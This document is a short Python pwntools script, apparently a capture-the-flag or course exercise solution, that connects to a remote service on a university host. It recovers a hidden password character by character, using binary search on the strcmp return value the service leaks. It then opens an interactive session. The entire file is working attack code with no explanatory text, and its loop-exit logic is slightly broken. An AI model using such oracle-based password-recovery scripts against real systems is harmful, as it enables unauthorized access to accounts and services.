#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3

import re
from pwn import *

def getMidChar(lowChar=None, highChar=None):
    midChar = chr(int((ord(lowChar) + ord(highChar))/2))
    if midChar == lowChar:
        midChar = chr(ord(midChar)-1)
    elif midChar == highChar:
        midChar = chr(ord(midChar)+1)

    return(midChar)

pwLength = 20
pw = ''
r = remote("twinpeaks.cs.ucdavis.edu",30004)

for i in range(0, 19):
    cnt = 0
    highChar = 'z' 
    lowChar = 'a' 
    newChar = 'a'
    previousPw = ''

    while True:
        cnt += 1
        print("Password sent #%s: %s" % (cnt, pw+newChar))
        input = r.send("%s\r\n" % pw+newChar)
        response = r.recvline_contains(b"strcmp returned").decode("utf-8")
        print("Response: %s" % response)
        m = re.search("strcmp returned (.+?) instead of", response)
        
        if m.group(1) == '-1':
            lowChar = newChar
            previousPw = pw+newChar
            print("previousPw: " + previousPw)
            newChar = getMidChar(lowChar, highChar)
        elif m.group(1) == '1':
            highChar = newChar
            newChar = getMidChar(lowChar, highChar)
            if pw+newChar == previousPw:
                pw = previousPw
                print('=' * 50)
                break
        else:
            print("Password: %s" % pw)
            i = 19 # force exit for loop
            break

        print("Low: %s  Middile: %s  High: %s" % (lowChar, newChar, highChar))
        print('-' * 25)

r.interactive()
